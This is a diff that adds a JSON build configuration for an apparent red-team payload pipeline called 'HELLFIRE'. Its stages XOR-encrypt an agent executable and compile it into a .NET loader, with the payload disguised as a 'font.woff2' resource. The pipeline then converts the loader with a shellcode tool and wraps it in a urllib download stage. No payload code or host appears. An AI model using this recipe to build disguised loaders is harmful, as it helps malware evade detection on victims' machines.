@@ -1,0 +1,65 @@
+{
+	"name":"HELLFIRE",
+	"version":"0.1",
+	"author":"david",
+	"description":"urllib loader of encrypted iceberg stage for HELLFIRE 2022 project",
+	"TTP":[],
+	"stages": [
+    {
+        "action":"getfile",
+        "action_prereqs":"",
+        "action_params": {
+            "nix_path": "/Users/david/Projects/HF22/payloads/agent-1-debug.exe",
+            "path": "Z:\\HF22\\payloads\\agent-2-debug.exe",
+            "binary": true
+        }
+    },
+    {
+        "action":"encrypt_xor",
+        "action_prereqs":"",
+        "action_params": {
+            "generate_key": false,
+            "_generate_key_comments": "If true, generates a key the same size as the payload, and saves to password file. If false, reads key from file",
+            "nix_password_file": "/Users/david/Projects/HF22/payloads/xorkey",
+            "password_file": "Z:\\HF22\\payloads\\xorkey",
+            "mode": "xor",
+            "_mode_comments": "supports XOR or XNOR",
+            "unsafe": true
+        }
+    },
+    {
+        "action":"compile_sln",
+        "action_prereqs":"",
+        "action_params": {
+            "project_path": "Z:\\HF22\\payloads\\HF22LOADER",
+            "msbuild_path": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe",
+            "update": {
+                "resource": {
+                    "dst": "HF22LOADER\\Resources\\font.woff2"
+                }
+            },
+            "arch": "x64"
+        }
+    },
+    {
+        "action":"crossfit",
+        "action_prereqs":"",
+        "action_params": {
+            "crossfit_path": "\\tools\\CLRvoyance\\CLRvoyance\\",
+            "arch": "x64",
+            "apc_safe": false,
+            "newdomain": false
+        }
+    },
+    {
+        "action":"urllib",
+        "action_prereqs":"",
+        "action_params": {
+            "exe_path": "/Users/david/Projects/HF22/payloads/agent-1-debug.exe",
+            "arch": "x64",
+            "apc_safe": false,
+            "newdomain": false
+        }
+    }
+    ]
+}
